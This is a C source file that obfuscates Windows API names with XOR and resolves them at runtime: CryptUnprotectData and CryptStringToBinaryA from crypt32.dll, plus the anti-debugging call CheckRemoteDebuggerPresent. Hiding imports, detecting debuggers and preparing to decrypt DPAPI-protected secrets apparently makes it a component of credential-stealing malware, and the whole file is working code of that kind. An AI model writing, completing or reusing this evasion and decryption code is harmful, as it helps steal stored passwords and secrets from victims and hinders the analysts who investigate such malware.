#include "obfuscation.h"

#include <libloaderapi.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
/**
 * XOR the given string pointer by xoring each char with 42
 * @param str : the string to obfuscate/deobfuscate by xoring each character
 * @param size : size of given string
 */
void xor_str(char *str, int size) {
  while (size-- > 0) {
    *str++ ^= 42;
  }
}

/**
 * XOR the given wide string pointer by xoring each wide char with 42
 * @param wstr : the wide string to obfuscate/deobfuscate by xoring each wide
 * character
 * @param size : size of given string
 */
void xor_wstr(wchar_t *wstr, int size) {
  while (size-- > 0) {
    *wstr++ ^= 42;
  }
}

void resolve_apis(hidden_apis *apis) {
  wchar_t kernel_str[] =
      L"\x41\x4f\x58\x44\x4f\x46\x19\x18\x04\x4e\x46\x46";  // kernel32.dll
  XOR_WSTR(kernel_str, wcslen(kernel_str));

  HMODULE hKernel32 = GetModuleHandleW(kernel_str);


  // Resolve strings
  char checkRemoteDbg_str[] =
      "\x69\x42\x4f\x49\x41\x78\x4f\x47\x45\x5e\x4f\x6e\x4f\x48\x5f\x4d\x4d\x4f"
      "\x58\x7a\x58\x4f\x59\x4f\x44\x5e";  // CheckRemoteDebuggerPresent
  XOR_STR(checkRemoteDbg_str, strlen(checkRemoteDbg_str));

  wchar_t crypt32_str[] = L"\x49\x58\x53\x5a\x5e\x19\x18\x04\x4e\x46\x46";  // crypt32.dll
  XOR_WSTR(crypt32_str, wcslen(crypt32_str));  
  HMODULE hCrypt32 = LoadLibraryW(crypt32_str);  


  // Resolve functions in crypt32.dll 
  char cryptUnprotectData_str[] = "\x69\x58\x53\x5a\x5e\x7f\x44\x5a\x58\x45\x5e\x4f\x49\x5e\x6e\x4b\x5e\x4b";

  XOR_STR(cryptUnprotectData_str, strlen(cryptUnprotectData_str));

  char cryptStringToBinaryA_str[] = "\x69\x58\x53\x5a\x5e\x79\x5e\x58\x43\x44\x4d\x7e\x45\x68\x43\x44\x4b\x58\x53\x6b";

  XOR_STR(cryptStringToBinaryA_str, strlen(cryptStringToBinaryA_str));

  apis->funcCryptUnprotectData = (PCryptUnprotectData)GetProcAddress(hCrypt32, cryptUnprotectData_str);
  

  apis->funcCryptStringToBinaryA = (PCryptStringToBinaryA)GetProcAddress(hCrypt32, cryptStringToBinaryA_str);


  // Resolve functions in kernel32.dll 
  apis->funcCheckRemoteDebuggerPresent =
      (PCheckRemoteDebuggerPresent)GetProcAddress(hKernel32,
                                                  checkRemoteDbg_str);

    /*char loadLibA_str[] = "\x66\x45\x4b\x4e\x66\x43\x48\x58\x4b\x58\x53\x6b";
  XOR_STR(loadLibA_str, strlen(loadLibA_str));
  char SHGetKnownFolderPath_str[] =
      "\x79\x62\x6d\x4f\x5e\x61\x44\x45\x5d\x44\x6c\x45\x46\x4e\x4f\x58\x7a\x4b"
      "\x5e\x42";
  XOR_STR(SHGetKnownFolderPath_str, strlen(SHGetKnownFolderPath_str));*/
  //apis->funcLoadLibraryA =
      //(PLoadLibraryA)GetProcAddress(hKernel32, loadLibA_str);
  // apis->funcSHGetKnownFolderPath = (PSHGetKnownFolderPath)GetProcAddress(
  // hKernel32, SHGetKnownFolderPath_str);
}
